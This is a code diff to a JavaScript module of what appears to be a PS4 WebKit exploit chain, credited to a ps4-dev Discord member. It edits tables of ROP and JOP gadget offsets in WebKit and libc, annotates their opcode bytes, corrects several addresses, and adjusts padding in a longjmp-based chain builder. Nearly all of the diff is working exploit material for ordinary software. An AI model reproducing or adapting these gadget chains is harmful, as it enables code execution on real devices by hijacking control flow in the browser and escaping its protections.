@@ -17,16 +17,13 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 
 // by janisslsm (John) from ps4-dev discord
 
-import * as config from '/config.mjs';
-
 import { Int } from '/module/int64.mjs';
-import { log, align, die } from '/module/utils.mjs';
-import { Addr, mem } from '/module/mem.mjs';
-import { KB, MB } from '/module/constants.mjs';
+import { log, die } from '/module/utils.mjs';
+import { mem } from '/module/mem.mjs';
+import { KB} from '/module/constants.mjs';
 import { ChainBase } from '/module/chain.mjs';
 
 import {
-    make_buffer,
     find_base,
     get_view_vector,
     resolve_import,
@@ -34,7 +31,6 @@ import {
 } from '/module/memtools.mjs';
 
 import * as rw from '/module/rw.mjs';
-import * as o from '/module/offset.mjs';
 
 const origin = window.origin;
 const port = '8000';
@@ -42,9 +38,9 @@ const url = `${origin}:${port}`;
 
 const syscall_array = [];
 
-const offset_func_exec = 0x18;
+//const offset_func_exec = 0x18;
 const offset_textarea_impl = 0x18;
-const offset_js_inline_prop = 0x10;
+//const offset_js_inline_prop = 0x10;
 
 // WebKit offsets of imported functions
 const offset_wk_stack_chk_fail = 0x178;
@@ -142,44 +138,34 @@ const jop5 = 'pop rsp; ret';
 const rop_epilogue = 'leave; ret';
 
 const webkit_gadget_offsets = new Map(Object.entries({
-    'pop rax; ret' : 0x0000000000051a12,
-    'pop rbx; ret' : 0x00000000000be5d0,
-    'pop rcx; ret' : 0x00000000000657b7,
-    'pop rdx; ret' : 0x000000000000986c,
+    'pop rax; ret' : 0x0000000000051a12, // `58 c3`
+    'pop rbx; ret' : 0x00000000000be5d0, // `5b c3`
+    'pop rcx; ret' : 0x00000000000657b7, // `59 c3`
+    'pop rdx; ret' : 0x000000000000986c, // `5a c3`
 
-    'pop rbp; ret' : 0x00000000000000b6,
-    'pop rsi; ret' : 0x000000000001F4D6,
-    'pop rdi; ret' : 0x0000000000319690,
-    'pop rsp; ret' : 0x000000000004e293,
+    'pop rbp; ret' : 0x00000000000000b6, // `5d c3`
+    'pop rsi; ret' : 0x000000000001f4d6, // `5e c3`
+    'pop rdi; ret' : 0x0000000000319690, // `5f c3`
+    'pop rsp; ret' : 0x000000000004e293, // `5c c3`
 
-    'pop r8; ret' : 0x00000000001a7ef1,
-    'pop r9; ret' : 0x0000000000422571,
-    'pop r10; ret' : 0x0000000000e9e1d1,
-    'pop r11; ret' : 0x0000000000620df9,
+    'pop r8; ret' : 0x00000000001a7ef1, // `47 58 c3`
+    'pop r9; ret' : 0x0000000000422571, // `47 59 c3`
+    'pop r10; ret' : 0x0000000000e9e1d1, // `47 5a c3`
+    'pop r11; ret' : 0x00000000012b1d51, // `47 5b c3`
 
-    'pop r12; ret' : 0x000000000085ec71,
-    'pop r13; ret' : 0x00000000001da461,
-    'pop r14; ret' : 0x000000000001f4d5,
-    'pop r15; ret' : 0x000000000031968f,
+    'pop r12; ret' : 0x000000000085ec71, // `47 5c c3`
+    'pop r13; ret' : 0x00000000001da461, // `47 5d c3`
+    'pop r14; ret' : 0x0000000000685d73, // `47 5e c3`
+    'pop r15; ret' : 0x00000000006ab3aa, // `47 5f c3`
 
-    'ret' : 0x0000000000000032,
-    'leave; ret' : 0x000000000008db5b,
+    'ret' : 0x0000000000000032, // `c3`
+    'leave; ret' : 0x000000000008db5b, // `c9 c3`
 
-    'neg rax; and rax, rcx; ret' : 0x00000000019771c4,
-    'adc esi, esi; ret' : 0x000000000148874e,
-    'add rax, rdx; ret' : 0x00000000003f662c,
-    'push rsp; jmp qword ptr [rax]' : 0x0000000002bae87f,
-    'add rcx, rsi; and rdx, rcx; or rax, rdx; ret' : 0x0000000001b1ed66,
-    'pop rsi; jmp qword ptr [rax + 0x1c]' : 0x00000000021fce7e,
-
-    'mov qword ptr [rdi], rsi; ret' : 0x0000000000040300,
-    'mov rax, qword ptr [rax]; ret' : 0x00000000000241cc,
-    'mov qword ptr [rdi], rax; ret' : 0x000000000000613b,
-    'mov dword ptr [rdi], eax; ret' : 0x000000000000613c,
-    'mov rdx, rcx; ret' : 0x000000000157fe71,
-
-    'mov dword ptr [rax], esi; ret' : 0x00000000005c3482,
-    'mov dword ptr [rdi], eax; ret' : 0x000000000000613c,
+    'mov rax, qword ptr [rax]; ret' : 0x00000000000241cc, // `48 8b 00 c3`
+    'mov qword ptr [rdi], rax; ret' : 0x000000000000613b, // `48 89 07 c3`
+    'mov dword ptr [rdi], eax; ret' : 0x000000000000613c, // `89 07 c3`
+    'mov dword ptr [rax], esi; ret' : 0x00000000005c3482, // `89 30 c3`
+  
 
     [jop2] : 0x0000000000683800,
     [jop3] : 0x0000000000303906,
@@ -192,13 +178,8 @@ const webkit_gadget_offsets = new Map(Object.entries({
 }));
 
 const libc_gadget_offsets = new Map(Object.entries({
-    'neg rax; ret' : 0x00000000000d3f03,
-    'mov rdx, rax; xor eax, eax; shl rdx, cl; ret' : 0x00000000000cefd9,
-    'mov qword ptr [rsi], rcx; ret' : 0x00000000000cf982,
-    'setjmp' : offset_libc_setjmp,
-    'longjmp' : offset_libc_longjmp,
-    'getcontext' : 0x24F04,
-    'setcontext' : 0x638,
+    'getcontext' : 0x24f04,
+    'setcontext' : 0x29448,
 }));
 
 const libkernel_gadget_offsets = new Map(Object.entries({
@@ -451,7 +432,7 @@ class Chain900Base extends ChainBase {
 
         // Padding as longjmp() pushes the rdi and return address in the
         // jmp_buf at the target rsp.
-        this.push_constant(0);
+        //this.push_constant(0);
         this.push_constant(0);
         const target_rsp = this.stack_addr.add(this.position);
 
